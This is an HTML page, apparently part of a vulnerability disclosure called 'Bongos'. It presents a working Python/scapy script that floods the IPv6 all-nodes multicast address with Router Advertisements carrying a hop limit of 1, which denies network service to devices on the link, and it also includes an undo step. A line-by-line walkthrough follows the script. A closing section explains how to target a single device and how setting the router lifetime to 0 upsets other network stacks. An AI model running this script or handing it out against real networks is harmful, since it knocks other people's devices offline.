<html><body><div><div class="container">
<h2>Bongos - Exploitation</h2>
<h2>Exploit code</h2>
<p>The following code includes a DoS, and an undo afterwards. Simply press
<code>Ctrl-C</code> once while drumming, and it will start the undo sequence.</p>
<h3>bongos.py</h3>
<pre><code>#!/bin/python
import scapy.all
from scapy.layers.inet6 import *

ip = IPv6()
ip.dst = "ff02::1"
icmp = ICMPv6ND_RA()

icmp.chlim = 1
print("Starting Bongos with hoplimit {0}".format(icmp.chlim))
send(ip/icmp, loop=True, inter=1)

icmp.chlim = 64
print("Restoring with hoplimit {0}".format(icmp.chlim))
send(ip/icmp, loop=True, inter=1)
</code></pre>
<p>Run the above code as <code>root</code> and it should work.</p>
<h3>Explanation</h3>
<p>First we set up scapy and import the IPv6 functions:</p>
<pre><code>import scapy.all
from scapy.layers.inet6 import *
</code></pre>
<p>Then we declare an empty IPv6 packet, and set the destination to be
<a href="https://tools.ietf.org/html/rfc4291#section-2.7">link-local</a>:</p>
<pre><code>ip = IPv6()
ip.dst = "ff02::1"
</code></pre>
<p>After this, we set up an ICMPv6 packet of type
"NetworkDiscovery: RouterAdvertisement":</p>
<pre><code>icmp = ICMPv6ND_RA()
</code></pre>
<p>Then we set the "CurrentHopLimit" (<code>chlim</code>) to 1, and fire it off to the network:</p>
<pre><code>icmp.chlim = 1
send(ip/icmp, loop=True, inter=1)
</code></pre>
<p>We loop forever, sending one beat every second. There is no data-payload
involved, only the empty RouterAdvertisement packet.</p>
<p>Once you press <code>Ctrl-C</code>,  we restore the "CurrentHopLimit" to 64, and start
another beat of the bongos. This is to restore any devices that are currently
unavailable:</p>
<pre><code>icmp.chlim = 64
send(ip/icmp, loop=True, inter=1)
</code></pre>
<h2>More fun</h2>
<p>This attack works both on the link-local Broadcast, and on a unicast. To target
a single device, simply change the <code>ip.dst</code> variable.</p>
<p>Some other network stacks will get very upset if you also set the
<code>icmp.routerlifetime</code> property of the packet down to 0.</p>

</div>
</div></body></html>